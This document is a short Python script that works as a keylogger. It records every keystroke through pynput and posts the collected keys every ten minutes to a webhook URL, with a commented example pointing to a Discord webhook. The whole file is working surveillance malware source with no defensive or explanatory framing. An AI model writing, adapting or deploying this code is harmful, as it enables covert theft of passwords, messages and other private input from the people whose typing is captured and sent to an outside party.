import time
import requests
from pynput import keyboard

def send_keystrokes_to_webhook(webhook_url):
    keystrokes = []

    def on_press(key):
        keystrokes.append(key)

    def send_keystrokes():
        while True:
            if keystrokes:
                payload = {'content': str(keystrokes)}
                requests.post(webhook_url, data=payload)
                keystrokes.clear()
            time.sleep(600)  # Send keystrokes every 10 minutes

    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()

    send_keystrokes()

# Usage example:
# webhook_url = 'https://discord.com/api/webhooks/your_webhook_url'
# send_keystrokes_to_webhook(webhook_url)
